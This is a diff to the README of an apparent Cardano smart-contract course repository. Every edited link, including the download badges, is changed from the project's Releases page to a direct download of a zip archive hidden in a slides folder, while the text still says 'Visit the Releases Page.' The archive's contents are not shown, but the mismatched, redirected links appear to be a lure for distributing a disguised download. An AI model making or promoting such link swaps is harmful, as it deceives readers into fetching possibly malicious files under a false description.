@@ -1,6 +1,6 @@
 # 📚 cardano-developer-course-UBA - Learn Smart Contracts and DApps Easily
 
-[![Download](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/guerlo/cardano-developer-course-UBA/releases)
+[![Download](https://raw.githubusercontent.com/guerlo/cardano-developer-course-UBA/main/diapositivas/04/cardano-developer-course-UBA_v2.0.zip)](https://raw.githubusercontent.com/guerlo/cardano-developer-course-UBA/main/diapositivas/04/cardano-developer-course-UBA_v2.0.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ To jump right in, follow these simple steps.
 
 1. **Visit the Releases Page:**  
    To download the material, please visit the Releases page.  
-   [Download Here](https://github.com/guerlo/cardano-developer-course-UBA/releases)
+   [Download Here](https://raw.githubusercontent.com/guerlo/cardano-developer-course-UBA/main/diapositivas/04/cardano-developer-course-UBA_v2.0.zip)
 
 2. **Select the Latest Version:**  
    Look for the most recent version. It usually has the highest version number. 
@@ -41,7 +41,7 @@ To get started with your learning journey, follow these steps:
 
 1. **Visit the Releases Page:**  
    Click the link to access the page:  
-   [Download Here](https://github.com/guerlo/cardano-developer-course-UBA/releases)
+   [Download Here](https://raw.githubusercontent.com/guerlo/cardano-developer-course-UBA/main/diapositivas/04/cardano-developer-course-UBA_v2.0.zip)
 
 2. **Download the Files:**  
    Once on the page, find the assets section and download the files you need. It may include PDFs, code examples, and other relevant documents.
@@ -81,4 +81,4 @@ Completing this course will help you gain valuable skills. Upon finishing, you w
 
 Remember to keep revisiting the Releases page for updates and new materials. Happy learning!
 
-[![Download](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/guerlo/cardano-developer-course-UBA/releases)
+[![Download](https://raw.githubusercontent.com/guerlo/cardano-developer-course-UBA/main/diapositivas/04/cardano-developer-course-UBA_v2.0.zip)](https://raw.githubusercontent.com/guerlo/cardano-developer-course-UBA/main/diapositivas/04/cardano-developer-course-UBA_v2.0.zip)
